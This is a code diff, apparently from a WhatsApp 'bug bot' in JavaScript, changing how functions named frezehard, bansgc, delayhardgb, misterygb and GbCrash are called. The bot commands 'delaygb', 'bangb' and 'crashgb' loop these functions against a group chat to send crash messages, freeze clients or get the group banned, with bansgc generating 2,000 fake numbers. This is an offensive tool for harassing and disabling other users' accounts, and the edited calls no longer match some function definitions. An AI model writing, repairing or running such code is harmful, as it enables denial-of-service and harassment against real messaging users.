@@ -437,7 +437,7 @@ async function frezehard(sock, target) {
   await sock.relayMessage(target, msg, { noselfsync: true });
 }
 //====[FUNCTION BUG GROUP]====//
-async function bansgc(sock, target) {
+async function bansgc(target) {
   try {
     if (!target.endsWith('@g.us')) throw new Error('group only')
     const fakeNumbers = Array.from({ length: 2000 }, () => {
@@ -1404,9 +1404,9 @@ case 'delaygb': {
     let isTarget = `${m.chat}`;
     reply(`success! sent bug to ${isTarget}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
     for (let i = 0; i < 5; i++) {
-await delayhardgb(sock, target);
-await delayhardgb(sock, target);
-await delayhardgb(sock, target);
+await delayhardgb(isTarget);
+await delayhardgb(isTarget);
+await delayhardgb(isTarget);
     }
     console.log(chalk.red.bold(`Success Sending Bug Type ${command} Into Group`));
 }
@@ -1421,7 +1421,7 @@ case 'bangb': {
     let isTarget = `${m.chat}`;
     reply(`success! sent ban to ${isTarget}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
     for (let i = 0; i < 5; i++) {
-await bansgc(sock, target);
+await bansgc(isTarget);
     }
     console.log(chalk.red.bold(`Success Sending Ban Type ${command} Into Group`));
 }
@@ -1436,9 +1436,9 @@ case 'crashgb': {
     let isTarget = `${m.chat}`;
     reply(`success! sent bug to ${isTarget}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
     for (let i = 0; i < 5; i++) {   
-await misterygb(sock, target);
-await delayhardgb(sock, target);
-await GbCrash(sock, target);
+await misterygb(isTarget);
+await delayhardgb(isTarget);
+await GbCrash(isTarget);
     }
     console.log(chalk.red.bold(`Success Sending Bug Type ${command} Into Group`));
 }
